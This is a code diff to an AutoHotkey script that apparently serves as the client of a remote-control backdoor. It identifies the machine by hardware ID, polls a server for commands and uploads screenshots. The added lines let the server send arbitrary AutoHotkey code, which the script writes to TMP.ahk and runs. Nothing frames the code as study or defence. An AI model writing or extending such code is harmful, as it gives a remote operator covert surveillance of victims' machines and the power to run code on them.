@@ -39,7 +39,15 @@ else
 ;getting hwid
 
 pleasetry:
+try
+{
 HWIDAKA := getHWID()
+}
+catch
+{
+sleep 2000
+goto pleasetry
+}
 log("My HWID is " HWIDAKA)
 
 ;get installed apps list:
@@ -118,6 +126,26 @@ Loop
 	PutServer("screen.jpg", HWIDAKA "/screen.jpg", ServerLink)
 	FileDelete, screen.jpg
 	goto, Zaloop
+	}
+	if InStr(currentcommand, "executethecodeplease,") ;executethecodeplease,
+	{
+		DelServer(HWIDAKA "/current.command", ServerLink)
+		FileDelete, TMP.ahk
+		FileAppend, %currentcommand%, TMP.ahk
+		
+		If FileExist("C:\Program Files\AutoHotkey\AutoHotkeyU32.exe")
+			AHKPATH = C:\Program Files\AutoHotkey\AutoHotkeyU32.exe
+		Else
+			AHKPATH = %A_ScriptDir%\AutoHotkey.exe
+		
+		try
+		{
+		Run, "%AHKPATH%" "%A_WorkingDir%\TMP.ahk"
+		}
+		catch
+		{
+		log("Unable to execute Ahk code.")
+		}
 	}
 	
 	If InStr(currentcommand,"execute,")
